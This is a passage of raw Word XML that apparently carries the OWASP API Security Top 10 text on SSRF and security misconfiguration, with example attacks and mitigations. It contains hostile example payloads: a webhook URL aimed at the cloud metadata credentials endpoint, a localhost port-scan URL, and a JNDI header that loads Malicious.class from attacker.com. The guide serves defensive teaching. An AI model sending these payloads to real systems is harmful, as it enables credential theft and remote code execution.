          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/profile/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>upload_picture</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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picture_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "http://example.com/profile_pic.jpg"</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attacker can send a malicious URL and initiate port scanning within the internal network using the API Endpoint.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picture_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "localhost</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:8080</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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Based on the response time, the attacker can figure out whether the port is open or not.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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 security product generates events when it detects anomalies in the network. Some teams prefer to review the events in a broader, more generic monitoring system, such as a SIEM (Security Information and Event Management). For this purpose, the product provides integration with other systems using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>webhooks</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>.</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As part of a creation of a new </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>webhook</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve">, a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>GraphQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> mutation is sent with the URL of the SIEM API.</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lastRenderedPageBreak/>
        <w:t>POST /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>graphql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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variables</w:t>
      </w:r>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query</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "mutation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createNotificationChannel</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input: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channelName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: \"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ch_piney</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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notificationChannelConfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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customWebhookChannelConfigs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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url</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: \"http://www.siem-system.com/create_new_event\",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send_test_req</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: true</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channelId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>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During the creation process, the API back-end sends a test request to the provided </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>webhook</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL, and presents to the user the response.</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attacker can leverage this flow, and make the API request a sensitive resource, such as an internal cloud metadata service that exposes credentials:</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>graphql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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variables</w:t>
      </w:r>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query</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>": "mutation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createNotificationChannel</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>input: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channelName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: \"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ch_piney</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>\",</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notificationChannelConfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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customWebhookChannelConfigs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: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url</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\",</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r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>send_test_req</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: true</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lastRenderedPageBreak/>
        <w:t xml:space="preserve">      })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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>channelId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>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
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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8E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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Since the application shows the response from the test request, the attacker can view the credentials of the cloud environment.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9"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8E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Isolate the resource fetching mechanism in your network: usually these features are aimed to retrieve remote resources and not internal ones.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Whenever possible, use allow lists of:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>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 xml:space="preserve">Remote origins users are expected to download resources from (e.g. Google Drive, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Gravatar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, etc.)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>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URL schemes and ports</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="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Accepted media types for a given functionality</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Disable HTTP redirections.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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 a well-tested and maintained URL parser to avoid issues caused by URL parsing inconsistencies.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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Validate and sanitize all client-supplied input data.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E1AF9" w:rsidRPr="00790A44" w:rsidRDefault="008E1AF9" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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 not send raw responses to clients.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00271AF4" w:rsidRPr="00790A44" w:rsidRDefault="00271AF4" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:jc w:val="lowKashida"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F"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API8:2023 Security Misconfiguration</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4362"/>
        <w:gridCol w:w="4552"/>
        <w:gridCol w:w="3206"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidTr="00E9299F">
        <w:trPr>
          <w:tblHeader/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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E9299F" w:rsidRPr="00790A44" w:rsidTr="00E9299F">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Widespread</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Severe</w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t> : Business Specific</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidTr="00E9299F">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>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Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>access or knowledge of the system. Most of this is public knowledge and exploits may be available.</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Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>and exploit misconfigurations such as unnecessary services or legacy options.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:tcMar>
              <w:top w:w="225" w:type="dxa"/>
              <w:left w:w="300" w:type="dxa"/>
              <w:bottom w:w="225" w:type="dxa"/>
              <w:right w:w="300" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F"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Security misconfigurations not only expose sensitive user data, but also system details that </w:t>
            </w:r>
            <w:r w:rsidRPr="00790A44">
              <w:rPr>
                <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>can lead to full server compromise.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299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API might be vulnerable if:</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Appropriate security hardening is missing across any part of the API stack, or if there are improperly configured permissions on cloud services</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latest security patches are missing, or the systems are out of date</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Unnecessary features are enabled (e.g. HTTP verbs, logging features)</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There are discrepancies in the way incoming requests are processed by servers in the HTTP server chain</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Transport Layer Security (TLS) is missing</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Security or cache control directives are not sent to clients</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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 Cross-Origin Resource Sharing (CORS) policy is missing or improperly set</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F" w:rsidP="00AD3BE1">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="15"/>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Error messages include stack traces, or expose other sensitive information</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299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E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F"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back-end server maintains an access log written by a popular third-party open-source logging utility with support for placeholder expansion and JNDI (Java Naming and Directory Interface) lookups, both enabled by default. For each request, a new entry is written to the log file with the following pattern: </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;method&gt; &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>api_version</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;/&lt;path&gt; - &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>status_code</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t>.</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bad actor issues the following API request, which gets written to the access log file:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299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GET /health</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299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X-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-Version: ${</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>jndi:ldap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>://attacker.com/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Malicious.class</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}</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Due to the insecure default configuration of the logging utility and a permissive network outbound policy, in order to write the corresponding entry to the access log, while expanding the value in the </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>X-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-Version</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> request header, the logging utility will pull and execute the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Malicious.class</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t> object from the attacker's remote controlled server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299F"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lastRenderedPageBreak/>
        <w:t>Scenario #2</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social network website offers a "Direct Message" feature that allows users to keep private conversations. To retrieve new messages for a specific conversation, the website issues the following API request (user interaction is not required):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E9299F" w:rsidRPr="00790A44" w:rsidRDefault="00E9299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GET /dm/user_updates.json?conversation_id=1234567&amp;cursor=GRlFp7LCUAAAA</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Because the API response does not include the </w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cache-Control</w:t>
      </w:r>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorBidi" w:hAnsiTheme="majorBidi" w:cstheme="majorBidi"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP response header, private conversations end-up cached by the web browser, allowing malicious actors to retrieve them from the browser cache files in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00790A44">
        <w:rPr>
